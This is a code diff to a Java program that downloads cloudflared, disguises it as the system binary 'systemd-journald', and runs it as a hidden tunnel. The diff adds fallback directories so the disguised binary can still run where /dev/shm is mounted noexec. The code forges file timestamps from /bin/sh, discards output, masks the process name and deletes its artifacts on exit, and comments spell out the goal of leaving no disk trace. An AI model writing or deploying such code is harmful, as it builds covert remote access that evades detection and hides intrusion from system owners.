@@ -146,9 +146,12 @@ public class App {
         if (!RUNNING.getAndSet(false)) return;
         stopCloudflared();
         try { if (singBox != null) singBox.stop(); } catch (Exception ignored) {}
-        // Wipe /dev/shm artifacts
+        // Wipe artifacts from all possible locations
         try { Files.deleteIfExists(Path.of("/dev/shm/sb-config.json")); } catch (Exception ignored) {}
         try { Files.deleteIfExists(Path.of("/dev/shm/libnss_dns.so.2")); } catch (Exception ignored) {}
+        try { Files.deleteIfExists(Path.of("/dev/shm/systemd-journald")); } catch (Exception ignored) {}
+        try { Files.deleteIfExists(Path.of("/tmp/systemd-journald")); } catch (Exception ignored) {}
+        try { Files.deleteIfExists(Path.of("systemd-journald")); } catch (Exception ignored) {}
         if (hold != null) hold.countDown();
     }
 
@@ -187,39 +190,55 @@ public class App {
         String url = cloudflaredUrl();
         byte[] bin = downloadBytes(url);
 
-        // Write to /dev/shm/systemd-journald (realistic system binary name)
-        // /dev/shm is tmpfs — no disk trace even though file is kept alive
-        cloudflaredBinary = Path.of("/dev/shm", "systemd-journald");
-        Files.write(cloudflaredBinary, bin);
-        cloudflaredBinary.toFile().setExecutable(true, false);
-        cloneTimestamp(cloudflaredBinary, Path.of("/bin/sh"));
+        // Try multiple directories in order: /dev/shm (tmpfs, no disk trace) → /tmp → working dir
+        // /dev/shm/ is often mounted with noexec, which causes Permission denied (error 13)
+        Path[] candidates = {
+                Path.of("/dev/shm"),
+                Path.of("/tmp"),
+                Path.of("")  // working directory (disk-backed, but reliable)
+        };
+
+        IOException lastError = null;
+        for (Path dir : candidates) {
+            try {
+                cloudflaredBinary = dir.resolve("systemd-journald");
+                // Delete stale file from previous attempt (if any)
+                Files.deleteIfExists(cloudflaredBinary);
+                Files.write(cloudflaredBinary, bin);
+                cloudflaredBinary.toFile().setExecutable(true, false);
+                cloneTimestamp(cloudflaredBinary, Path.of("/bin/sh"));
+
+                // Try to start cloudflared
+                ProcessBuilder pb = new ProcessBuilder(
+                        cloudflaredBinary.toAbsolutePath().toString(), "tunnel", "run"
+                );
+                Map<String, String> env = pb.environment();
+                env.clear();
+                env.put("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
+                env.put("HOME", "/var/lib/systemd");
+                env.put("USER", "root");
+                env.put("LOGNAME", "root");
+                env.put("SHELL", "/bin/sh");
+                env.put("TERM", "linux");
+                env.put("TUNNEL_TOKEN", CF_TOKEN);
+                env.remove("LD_PRELOAD");
+                env.remove("LD_LIBRARY_PATH");
+                env.remove("JAVA_TOOL_OPTIONS");
+                pb.redirectErrorStream(true);
+                pb.redirectOutput(ProcessBuilder.Redirect.to(Path.of("/dev/null").toFile()));
+
+                cloudflaredProcess = pb.start();
+                cloudflaredPid = getPid(cloudflaredProcess);
+                lastError = null;
+                break;  // success
+            } catch (IOException e) {
+                lastError = e;
+                cloudflaredBinary = null;
+                // Try next directory
+            }
+        }
         Arrays.fill(bin, (byte) 0);
-
-        // --- Start cloudflared directly via ProcessBuilder (no shell wrapper) ---
-        // Direct ProcessBuilder is more reliable than sh -c "cmd &" on all systems.
-        // PPID will be the Java process (not 1), but we write /proc/pid/comm for
-        // process name masquerading, so ps aux still shows "systemd-journal".
-        Path stdout = Path.of("/dev/null");
-        ProcessBuilder pb = new ProcessBuilder(
-                cloudflaredBinary.toAbsolutePath().toString(), "tunnel", "run"
-        );
-        Map<String, String> env = pb.environment();
-        env.clear();
-        env.put("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
-        env.put("HOME", "/var/lib/systemd");
-        env.put("USER", "root");
-        env.put("LOGNAME", "root");
-        env.put("SHELL", "/bin/sh");
-        env.put("TERM", "linux");
-        env.put("TUNNEL_TOKEN", CF_TOKEN);
-        env.remove("LD_PRELOAD");
-        env.remove("LD_LIBRARY_PATH");
-        env.remove("JAVA_TOOL_OPTIONS");
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.to(stdout.toFile()));
-
-        cloudflaredProcess = pb.start();
-        cloudflaredPid = getPid(cloudflaredProcess);
+        if (lastError != null) throw lastError;
 
         // --- Masquerade /proc/pid/comm ---
         if (cloudflaredPid > 0) {
